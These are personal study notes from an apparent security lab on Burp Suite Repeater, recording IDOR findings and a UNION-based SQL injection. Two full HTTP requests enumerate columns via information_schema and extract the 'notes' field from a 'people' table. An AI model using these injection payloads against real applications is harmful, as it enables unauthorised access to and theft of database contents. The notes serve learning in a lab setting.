# Burp Suite: *Repeater*

> Burp Suite Repeater allows us to craft and/or relay intercepted requests to a target at will.

- CAPTURE reqeusts via proxy
- EDIT requests 
- SEND requests to host
- CREATING requests from scratch
- Observing request/response objects in action

> *Postman on steroids with additional utilities*

Action:

- Basic interface navigation
- Basics of crafting requests:: TONNES of XP via my job
- `/products/:id` page
  - Broke the page by passing -ve values as `:id`
  - Found **IDOR** vulnerability within
  - Possibly even **SQLi** vulnerability
- `/about/:id` page
  - Found **IDOR** vulnerability within
  - Exploited **SQLi** vulnerability

### Notes on *SQLi(SQL injection)* vulnerability

- Added `'` initially ahead of `:id` for getting to know about ***SQLi***
  - It introduces `string` initiation in query
  - Can break any SQL query if placed incorrectly, in our case it's a lone character
- The backend was only displaying results from first row and one specific column(`id`)
  - Hence kept all of the fields `null` except for it
- Hence passed illegal non-existent IDs as parameter, for making first row blank(for actual payloads)
- Unionized results with actual query and displayed results of exploited query on first row's, first column element and utilized it
- Used four `null`'s for matching existing query pattern with `UNION`ized query
- `information_schema` table consists of all schema related information in SQL
- Additional note: *Two `\n` characters are reqd for HTTP request termination*

```HTTP
# recon for columns within query
GET /about/-1 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns where table_name="people" HTTP/1.1
Host: 10.10.175.176
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


# extracting payload
GET /about/-1 UNION ALL SELECT notes, null, null, null, null FROM people where id=1 HTTP/1.1
Host: 10.10.175.176
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```

> Personal note: Could have exeuted this via Postman as well

### Further studies

- SQLi attacks and common patterns
- Exploiting vulnerabilities within other noSQL databases
  - Using same concepts of SQLi(via and not via application interfaces)
  - Using DB specific concepts

### Tools

- Burp Suite Repeater
- Postman:: to learn in-depth
- cURL